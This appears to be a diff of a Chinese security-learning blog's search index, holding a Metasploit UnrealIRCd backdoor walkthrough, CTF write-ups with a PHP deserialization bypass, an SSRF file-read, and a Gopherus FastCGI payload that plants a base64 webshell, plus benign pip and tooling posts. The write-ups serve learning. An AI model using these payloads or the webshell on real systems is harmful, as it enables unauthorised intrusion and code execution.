-    <url>/2021/12/21/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="metasploit溢出UnrealIRCd后门漏洞"><a href="#metasploit溢出UnrealIRCd后门漏洞" class="headerlink" title="metasploit溢出UnrealIRCd后门漏洞"></a>metasploit溢出UnrealIRCd后门漏洞</h2><h3 id="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"><a href="#目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限" class="headerlink" title="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"></a>目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限</h3><h3 id="原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"><a href="#原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。" class="headerlink" title="原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"></a>原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。</h3><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>利用nmap扫描主机，确定<code>6667</code>端口开放，对应服务为<code>unreal ircd</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.PNG" alt="1"></p>
-<p>终端输入msfconsole，进入msf后输入<code>search unreal ircd</code>，搜索相关工具和攻击载荷</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.PNG" alt="2"></p>
-<p>终端输入命令<code>use exploit/unix/irc/unreal_ircd_3281backdoor</code>,启用漏洞模块</p>
-<p>输入show options,查看需要设置的相关选项<br><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/3.PNG" alt="3"><br>设置目标ip</p>
-<p>run或者exploit,开始攻击，攻击成功后，建立shell会话</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/4.PNG" alt="4"></p>
-<p>终端输入whoami，查看权限root，输入cat /etc/passwd，查看系统账户</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/5.PNG" alt="5"></p>
-<p>本机4444端口建立远程会话</p>
-]]></content>
-      <tags>
-        <tag>metasploit</tag>
-        <tag>unrealircd</tag>
-        <tag>后门</tag>
-        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -454,6 +485,43 @@
       </tags>
   </entry>
   <entry>
+    <title>metasploit溢出UnrealIRCd后门漏洞</title>
+    <url>/2021/12/21/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="metasploit溢出UnrealIRCd后门漏洞"><a href="#metasploit溢出UnrealIRCd后门漏洞" class="headerlink" title="metasploit溢出UnrealIRCd后门漏洞"></a>metasploit溢出UnrealIRCd后门漏洞</h2><h3 id="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"><a href="#目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限" class="headerlink" title="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"></a>目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限</h3><h3 id="原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"><a href="#原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。" class="headerlink" title="原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"></a>原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。</h3><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>利用nmap扫描主机，确定<code>6667</code>端口开放，对应服务为<code>unreal ircd</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.PNG" alt="1"></p>
+<p>终端输入msfconsole，进入msf后输入<code>search unreal ircd</code>，搜索相关工具和攻击载荷</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.PNG" alt="2"></p>
+<p>终端输入命令<code>use exploit/unix/irc/unreal_ircd_3281backdoor</code>,启用漏洞模块</p>
+<p>输入show options,查看需要设置的相关选项<br><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/3.PNG" alt="3"><br>设置目标ip</p>
+<p>run或者exploit,开始攻击，攻击成功后，建立shell会话</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/4.PNG" alt="4"></p>
+<p>终端输入whoami，查看权限root，输入cat /etc/passwd，查看系统账户</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/5.PNG" alt="5"></p>
+<p>本机4444端口建立远程会话</p>
+]]></content>
+      <tags>
+        <tag>metasploit</tag>
+        <tag>unrealircd</tag>
+        <tag>后门</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python永久换第三方库国内源</title>
+    <url>/2021/11/24/python%E6%B0%B8%E4%B9%85%E6%8D%A2%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E5%9B%BD%E5%86%85%E6%BA%90/</url>
+    <content><![CDATA[<h2 id="python永久换第三方库国内源"><a href="#python永久换第三方库国内源" class="headerlink" title="python永久换第三方库国内源"></a>python永久换第三方库国内源</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip config <span class="built_in">set</span> global.index<span class="literal">-url</span> https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
+
+<p> 国内靠谱的 pip 镜像源有：</p>
+<p>(1)清华: <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p>
+<p>(2)豆瓣: <a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></p>
+<p>(3)阿里: <a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></p>
+]]></content>
+      <tags>
+        <tag>python</tag>
+        <tag>pip</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pyautogui的简单基础</title>
     <url>/2021/11/24/pyautogui%E7%9A%84%E7%AE%80%E5%8D%95%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h2 id="pyautogui的简单基础"><a href="#pyautogui的简单基础" class="headerlink" title="pyautogui的简单基础"></a>pyautogui的简单基础</h2><h3 id="安装pyautogui"><a href="#安装pyautogui" class="headerlink" title="安装pyautogui"></a>安装pyautogui</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip install pyautogui</span><br></pre></td></tr></table></figure>
@@ -476,21 +544,6 @@
       <tags>
         <tag>python</tag>
         <tag>pyautogui</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python永久换第三方库国内源</title>
-    <url>/2021/11/24/python%E6%B0%B8%E4%B9%85%E6%8D%A2%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E5%9B%BD%E5%86%85%E6%BA%90/</url>
-    <content><![CDATA[<h2 id="python永久换第三方库国内源"><a href="#python永久换第三方库国内源" class="headerlink" title="python永久换第三方库国内源"></a>python永久换第三方库国内源</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip config <span class="built_in">set</span> global.index<span class="literal">-url</span> https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
-
-<p> 国内靠谱的 pip 镜像源有：</p>
-<p>(1)清华: <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p>
-<p>(2)豆瓣: <a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></p>
-<p>(3)阿里: <a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></p>
-]]></content>
-      <tags>
-        <tag>python</tag>
-        <tag>pip</tag>
       </tags>
   </entry>
   <entry>
@@ -621,12 +674,9 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">could get the res: Incorrect <span class="keyword">integer</span> value: <span class="string">&#x27;redrock&#123;2cb81f52-257c-4187-8a5d-9d3456007631&#125;&#x27;</span> <span class="keyword">for</span> column `shopxo`.`s_admin`.`id` at row <span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="ez-serialize："><a href="#ez-serialize：" class="headerlink" title="ez_serialize："></a>ez_serialize：</h3><p>进入网站就看见源码，是经典的php反序列化。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">class Test&#123;    </span><br><span class="line">    private $secret;    </span><br><span class="line">    function __construct($secret) &#123;        $this-&gt;secret=$secret;    &#125;    </span><br><span class="line">    function __wakeup() &#123;        $this-&gt;secret=&quot;error&quot;;    &#125;    </span><br><span class="line">    function __destruct() &#123;        if ($this-&gt;secret === &quot;admin&quot;) &#123;            global $flag;            echo $flag;        &#125; else &#123;            die(&quot;secret error!&quot;);        &#125;    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[serialize];</span><br><span class="line">if (stristr($a, &quot;secret&quot;)) &#123;    die(&quot;Go out!!Hacker!!&quot;);&#125; </span><br><span class="line">else &#123;    unserialize($a);&#125; </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);include &quot;flag.php&quot;;class Test&#123;    private $secret;    function __construct($secret) &#123;        $this-&gt;secret=$secret;    &#125;    function __wakeup() &#123;        $this-&gt;secret=&quot;error&quot;;    &#125;    function __destruct() &#123;        if ($this-&gt;secret === &quot;admin&quot;) &#123;            global $flag;            echo $flag;        &#125; else &#123;            die(&quot;secret error!&quot;);        &#125;    &#125;&#125;$a = $_GET[serialize];if (stristr($a, &quot;secret&quot;)) &#123;    die(&quot;Go out!!Hacker!!&quot;);&#125; else &#123;    unserialize($a);&#125; </span><br></pre></td></tr></table></figure>
 
-<p>首先接受一个serialize的参数，通过stristr函数防止参数中含有sercret字符串，然后反序列化这个变量，首先构造一个基础的payload=?serialize=O:4:”Test”:1:{s:10:”%00Test%00secret”;s:5:”admin”;}(加上%00是因为secret是私有变量，变量中的类名前后会有空白符)，但是这个过不去secret，但是表示字符类型的s大写时，会被当成16进制解析，构造payload=?serialize=O:4:”Test”:1:{S:12:”\00\54\65\73\74\00\73\65\63\72\65\74”;s:5:”admin”;}，但是反序列化时会优先使用__wakeup方法(如果有的话)，这时就需要绕过wakeup，这是个cve漏洞，当反序列化字符串，表示属性的个数大于真实的个数，就会跳过wakeup执行。最终</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload=?serialize=O:4:&quot;Test&quot;:5:&#123;S:12:&quot;\00\54\65\73\74\00\73\65\63\72\65\74&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>（这道题属性个数大于1即可）。</p>
+<p>首先接受一个serialize的参数，通过stristr函数防止参数中含有sercret字符串，然后反序列化这个变量，首先构造一个基础的payload=?serialize=O:4:”Test”:1:{s:10:”%00Test%00secret”;s:5:”admin”;}(加上%00是因为secret是私有变量，变量中的类名前后会有空白符)，但是这个过不去secret，但是表示字符类型的s大写时，会被当成16进制解析，构造payload=?serialize=O:4:”Test”:1:{S:12:”\00\54\65\73\74\00\73\65\63\72\65\74”;s:5:”admin”;}，但是反序列化时会优先使用__wakeup方法(如果有的话)，这时就需要绕过wakeup，这是个cve漏洞，当反序列化字符串，表示属性的个数大于真实的个数，就会跳过wakeup执行。最终payload=?serialize=O:4:”Test”:5:{S:12:”\00\54\65\73\74\00\73\65\63\72\65\74”;s:5:”admin”;}（这道题属性个数大于1即可）。</p>
 <h3 id="start-xxe："><a href="#start-xxe：" class="headerlink" title="start xxe："></a>start xxe：</h3><p>题目告诉是xxe类型的题，打开连接，看到是一个登录界面，查看源代码，有一个注释告诉了flag的位置。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--flag is in /flag--&gt;</span><br></pre></td></tr></table></figure>
 
@@ -644,7 +694,7 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;star刚学了php，他听说php自带curl的功能，于是他写了个网页&lt;/h1&gt;&lt;p&gt;请post url&lt;/p&gt;&lt;h2&gt;请求结果&lt;/h2&gt;&lt;h2&gt;&lt;h1&gt;star刚学了php，他听说php自带curl的功能，于是他写了个网页&lt;/h1&gt;&lt;p&gt;请post url&lt;/p&gt;&lt;?php$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_POST[&#x27;url&#x27;]);curl_setopt($ch, CURLOPT_HEADER, 0);?&gt;&lt;h2&gt;请求结果&lt;/h2&gt;&lt;h2&gt;&lt;?phpecho curl_exec($ch);curl_close($ch);?&gt;&lt;/h2&gt;&lt;script&gt;console.log(&quot;hack by yyz!&quot;)&lt;/script&gt;1&lt;/h2&gt;&lt;script&gt;console.log(&quot;hack by yyz!&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
 <p>没有进行任何过滤。后面发放提示是nginx和php结构，构造payload查看nginx配置文件，url=file:////etc/nginx/nginx.conf，才发现有fastcgi，fastcgi_pass   127.0.0.1:9000，这时利用ssrf攻击本地PHP-FPM服务，达到任意代码执行的效果。直接利用gopher工具构造payload。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> python gopherus.py --exploit fastcgi  ________              .__ /  _____/  ____</span> </span><br><span class="line">______ |  |__   ___________ __ __  ______/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \</span><br><span class="line">|  \/  ___/\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \ \______  /\____/|</span><br><span class="line">__/|___|  /\___  &gt;__|  |____//____  &gt;        \/       |__|        \/     \/   \/   </span><br><span class="line">author: $_SpyD3r_$Give one file name which should be surely present in the server (prefer .php file)if you don&#x27;t know press ENTER we have default one:  /var/www/html/index.php  /*前面获得的php绝对路径*/Terminal command to run:  echo PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsncGFzc3dvcmQnXSk7Pz4= |base64 -d &gt; /var/www/html/shell1.php  /*webshell base64写入，原马是&lt;?php system($_REQUEST[&#x27;password&#x27;]);?&gt;*/Your gopher link is ready to do SSRF:gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH147%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%93%04%00%3C%3Fphp%20system%28%27echo%20PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsncGFzc3dvcmQnXSk7Pz4%3D%20%7Cbase64%20-d%20%3E%20/var/www/html/shell1.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00-----------Made-by-SpyD3r-----------</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> python gopherus.py --exploit fastcgi  ________              .__ /  _____/  ____ ______ |  |__   ___________ __ __  ______/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \ \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;        \/       |__|        \/     \/                 \/                author: $_SpyD3r_<span class="variable">$Give</span> one file name <span class="built_in">which</span> should be surely present <span class="keyword">in</span> the server (prefer .php file)<span class="keyword">if</span> you don<span class="string">&#x27;t know press ENTER we have default one:  /var/www/html/index.php  /*前面获得的php绝对路径*/Terminal command to run:  echo PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsncGFzc3dvcmQnXSk7Pz4= |base64 -d &gt; /var/www/html/shell1.php  /*webshell base64写入，原马是&lt;?php system($_REQUEST[&#x27;</span>password<span class="string">&#x27;]);?&gt;*/Your gopher link is ready to do SSRF:gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH147%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%93%04%00%3C%3Fphp%20system%28%27echo%20PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsncGFzc3dvcmQnXSk7Pz4%3D%20%7Cbase64%20-d%20%3E%20/var/www/html/shell1.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00-----------Made-by-SpyD3r-----------</span></span></span><br></pre></td></tr></table></figure>
 
 <p>构造payload后进行一次url编码，(curl会进行一次解码)，成功写入木马，接下来使用即可。payload=/shell1.php?password=ls /;发现数据：easy_ssrf_flag_bc85c363e9d6fbb576fb9a85632f5135，以为这就是flag，提交不对，重新cat一下，payload=shell1.php?password=cat /easy_ssrf_flag_bc85c363e9d6fbb576fb9a85632f5135;（用file协议查看也可以）</p>
 <p>最后得到flag：redrock{244ddb7b-d731-43f5-aeae-05332f02874e}(环境变动，不是最开始的flag)。</p>
@@ -1042,6 +1092,20 @@
       </tags>
   </entry>
   <entry>
+    <title>反弹shell</title>
+    <url>/2022/01/05/%E5%8F%8D%E5%BC%B9shell/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>常用工具</title>
+    <url>/2021/11/24/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><p>图片隐写：zsteg，stegslove，outguess，pngcheck。</p>
+]]></content>
+      <tags>
+        <tag>tools</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>图片木马绕过文件内容检测上传webshell</title>
     <url>/2021/12/27/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/</url>
     <content><![CDATA[<h2 id="图片木马绕过文件内容检测上传webshell"><a href="#图片木马绕过文件内容检测上传webshell" class="headerlink" title="图片木马绕过文件内容检测上传webshell"></a>图片木马绕过文件内容检测上传webshell</h2><p>目的：</p>
@@ -1073,20 +1137,6 @@
         <tag>webshell</tag>
         <tag>图片木马</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>常用工具</title>
-    <url>/2021/11/24/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
-    <content><![CDATA[<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><p>图片隐写：zsteg，stegslove，outguess，pngcheck。</p>
-]]></content>
-      <tags>
-        <tag>tools</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>反弹shell</title>
-    <url>/2022/01/05/%E5%8F%8D%E5%BC%B9shell/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>正则表达式</title>
@@ -1212,59 +1262,6 @@
 ]]></content>
       <tags>
         <tag>-webshell -前端</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>metasploit之PostgreSQL</title>
-    <url>/2021/12/21/metasploit%E4%B9%8BPostgreSQL/</url>
-    <content><![CDATA[<h2 id="metasploit之PostgreSQL"><a href="#metasploit之PostgreSQL" class="headerlink" title="metasploit之PostgreSQL"></a>metasploit之PostgreSQL</h2><h3 id="目的：-Metasploit自带数据库（PostgreSQL）操作"><a href="#目的：-Metasploit自带数据库（PostgreSQL）操作" class="headerlink" title="目的： Metasploit自带数据库（PostgreSQL）操作"></a>目的： Metasploit自带数据库（PostgreSQL）操作</h3><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p><code>db_status</code>     查看数据库连接状态</p>
-<p><code>db_connect</code>  链接数据库</p>
-<p><code>db_disconnect</code>    断开连接</p>
-<p><code>vulns</code>     查看数据库扫描的主机的漏洞</p>
-<p><code>workspace</code>   工作空间，相对于独立的</p>
-<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msfconsole,<code>db_status</code>查看数据库连接状态，如果已连接执行<code>db_disconnect</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/1.PNG"></p>
-<p>exit退出软件，执行<code>service postgresql start</code>,启动数据库，<code>netstat -ntlp | grep postgre</code>查询是否启动成功，端口为<code>5432</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/2.PNG"></p>
-<p>重新运行msf,<code>db_status</code>查看是否连接<code>数据库</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/3.PNG"></p>
-<p><code>db_disconnect</code>断开连接，<code>db_status</code>查看连接状态</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/4.PNG"></p>
-<p>手动使用命令连接数据库，须知<code>数据库名</code>，<code>用户名</code>，<code>ip</code>以及<code>密码</code>，新建窗口，查询数据库配置文件，执行<code>find / -name database.yml</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/5.PNG"></p>
-<p><code>cat /usr/share/metasploit-framework/config/database.yml</code>，查看配置文件</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/6.PNG"></p>
-<p>返回msf界面，db_connect查看使用方法，选择第二种<code>db_connect 用户名:密码@ip/数据库名</code>，配置信息是<code>development</code>标签内的</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/7.PNG"><br><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/8.PNG"></p>
-<p>退出msf，执行<code>su postgres</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/9.PNG"></p>
-<p>创建新用户sub1及密码：<code>createuser sub1 -P</code>,回车并输入密码123456两次，<code>createdb --owner=sub1 test</code>连接数据库test，完成后exit退出</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/10.PNG"></p>
-<p>运行msfconsole，db_disconnect断开连接，执行<code>db_connect sub1:123456@localhost/test</code>连接刚才的数据库，<code>db_status</code>查看状态</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/11.PNG"></p>
-<p>退出msf,编辑<code>/etc/postgresql/9.5/main/postgresql.conf</code>文件，<code>shift+：</code>输入<code>set number</code>调出行号</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/12.PNG"></p>
-<p>找到59行，将#去掉，并且把<code>localhost</code>改为*，88行去掉#,然后保存退出</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/13.PNG"></p>
-<p>编辑<code>/etc/postgresql/9.5/main/pg_hba.conf</code>,最后一行添加<code>host all all 0.0.0.0/32 md5</code>，保存退出</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/14.PNG"></p>
-<p><code>service postgresql restart</code>，重启服务</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/15.PNG"></p>
-<p>打开msf，<code>workspace --help</code>查看用法</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/16.PNG"></p>
-<p><code>workspace -v</code>查看工作空间，只有默认的一个</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/17.PNG"></p>
-<p><code>worksapce -a 1</code>,<code>workspace -a 2</code> 添加工作空间1，2，执行<code>workspace -v</code> 查看工作空间</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/18.PNG"></p>
-<p><code>workspace -d 1</code>删除工作空间1，执行<code>workspace -v</code> 查看现有工作空间</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/19.PNG"></p>
-<p><code>workspace 2</code>切换到工作空间2</p>
-<p><code>workspace -d 2</code>删除工作空间2,自动切换到默认工作空间</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/20.PNG"></p>
-]]></content>
-      <tags>
-        <tag>msf</tag>
-        <tag>PostgreSQL</tag>
       </tags>
   </entry>
   <entry>
